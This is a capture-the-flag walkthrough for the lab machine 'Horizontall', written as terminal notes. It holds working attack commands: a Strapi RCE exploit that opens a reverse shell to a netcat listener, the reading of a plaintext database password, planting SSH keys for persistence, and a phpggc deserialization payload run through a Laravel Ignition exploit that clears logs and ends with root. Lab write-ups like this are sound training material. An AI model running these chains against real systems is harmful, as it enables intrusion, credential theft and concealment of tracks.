`└─$ nmap -p- -sSCV 10.10.11.105  --min-rate 999`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 17:42 AEDT
Nmap scan report for 10.10.11.105
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

r.a.get("http://api-prod.horizontall.htb/reviews")
`└─$ curl http://api-prod.horizontall.htb/reviews`

```
[{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},
{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},
{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the
futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}] 
```

http://api-prod.horizontall.htb/admin/init
```
{
  "data": {
    "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
    "currentEnvironment": "development",
    "autoReload": false,
    "strapiVersion": "3.0.0-beta.17.4"
  }
}
```
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
https://github.com/glowbase/CVE-2019-19609

```
└─$ python3 exploit.py http://api-prod.horizontall.htb/ 10.10.16.16 8821                                
========================================================
|    STRAPI REMOTE CODE EXECUTION (CVE-2019-19609)     |
========================================================
[+] Checking Strapi CMS version
[+] Looks like this exploit should work!
[+] Executing exploit

```

```
└─$ nc -nvlp 8821                              
listening on [any] 8821 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.11.105] 49208
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

`strapi@horizontall:/home/developer$ netstat -tnlp`
```
netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1959/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```
-rw-rw-r-- 1 strapi strapi 351 May 26  2021 /opt/strapi/myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
To perminent the access, we generate ssh key to host
```
└─$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ed/.ssh/id_rsa): /tmp/key/id_rsa
Enter passphrase for "/tmp/key/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/key/id_rsa
Your public key has been saved in /tmp/key/id_rsa.pub
The key fingerprint is:
SHA256:2e5vELW7MvOXFzmU0Q3fdshSx3J0ZmZz/TDa+kcgthA ed@kali
The key's randomart image is:
+---[RSA 3072]----+
|              o=&|
|          E .o+X@|
|           o.+o=O|
|         oo =.o+o|
|        S .+ =...|
|         .. +  +.|
|          .. o oo|
|         .+ o + o|
|          .Bo. o |
+----[SHA256]-----+
```
```
strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRPJ3Jnuoi46QRyleP9e45YTjngceiew+ZxkPdz413E6xBgVeFLTZq4PUrCHpbg6O03yG7rTaTg3CG1kKhpGhuQje58F9/+BzqYO71n7lp0R5xgNI44vJfCqYUeSalDlncTr/cBWWPTHDFm+TQRg7fdNglj/1/Vz/NpewjqRse6qiOuHekKSh7WdQuojWEE8KZccYszYns7cFTE+7JBymxmSa5Zxkf9JSkHh0pRNFEELdbvGS732jZK+eJr4fSrZK02JZjKNYnGgXjGwjk83JA9+tLajxtBDAEC4Kh1ua9SUH/VJyCbJLwDQidJ2cX/kZlA2vc6QbG2xheQBtNB9bwF7qz86HD8EA4BV9XUjhC/sdeUHNEoPW275C23LsLJWlp/rSROqPNDsnjIyEIJFHk4MgpC0hs/KZgfzzBecF8VFq3TjczresRgIIBAGytWn9ldDpPYIlZNUJebBKPtFGeEen7younBheTIXZWDJbnlZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > authorized_keys
<lZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > authorized_keys
```
portforwading port 8000 of host to kali
`└─$ ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.11.224`
http://127.0.0.1:8000/ - Laravel v8 (PHP v7.4.18)
https://github.com/ambionics/laravel-exploits

again, try to write pub key to /root/.ssh/authorized_keys

`─$ sudo php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -o /tmp/exp.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh/; echo "ssh-rsa`
```
AAAAB3NzaC1yc2EAAAADAQABAAABgQCRPJ3Jnuoi46QRyleP9e45YTjngceiew+ZxkPdz413E6xBgVeFLTZq4PUrCHpbg6O03yG7rTaTg3CG1kKhpGhuQje58F9/+BzqYO71n7lp0R5xgNI44vJfCqYUeSalDlncTr/cBWWPTHDFm+TQRg7fdNglj/1/Vz/NpewjqRse6qiOuHekKSh7WdQuojWEE8KZccYszYns7cFTE+7JBymxmSa5Zxkf9JSkHh0pRNFEELdbvGS732jZK+eJr4fSrZK02JZjKNYnGgXjGwjk83JA9+tLajxtBDAEC4Kh1ua9SUH/VJyCbJLwDQidJ2cX/kZlA2vc6QbG2xheQBtNB9bwF7qz86HD8EA4BV9XUjhC/sdeUHNEoPW275C23LsLJWlp/rSROqPNDsnjIyEIJFHk4MgpC0hs/KZgfzzBecF8VFq3TjczresRgIIBAGytWn9ldDpPYIlZNUJebBKPtFGeEen7younBheTIXZWDJbnlZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > /root/.ssh/authorized_keys'
PHP Deprecated:  Creation of dynamic property PHPGGC::$options is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 830
PHP Deprecated:  Creation of dynamic property PHPGGC::$parameters is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 831
PHP Deprecated:  Creation of dynamic property PHPGGC\Enhancement\Enhancements::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line 9
PHP Deprecated:  Creation of dynamic property PHPGGC::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 183
PHP Deprecated:  Creation of dynamic property PHPGGC\Phar\Phar::$metadata is deprecated in /usr/share/phpggc/lib/PHPGGC/Phar/Format.php on line 27
PHP Deprecated:  Creation of dynamic property PHPGGC\Phar\Phar::$dummy_metadata is deprecated in /usr/share/phpggc/lib/PHPGGC/Phar/Format.php on line 77
```

`└─$ python3 laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/exp.phar`
```
^[[+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
Exploit succeeded
+ Logs cleared
```

`└─$ ssh -i id_rsa root@10.129.11.224   `            
```
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

Last login: Mon Aug 23 11:43:44 2021 from 10.10.14.6
root@horizontall:~# cd /root/
```

#### Lesson learned
- For JS web page, check framwork file, js file.
- if we have write privi on /home/$user, we can update the shell via ssh, put pub key into .ssh/
- curl -I to view http Header
- phpggc, to generate phpar - PHP archive file.
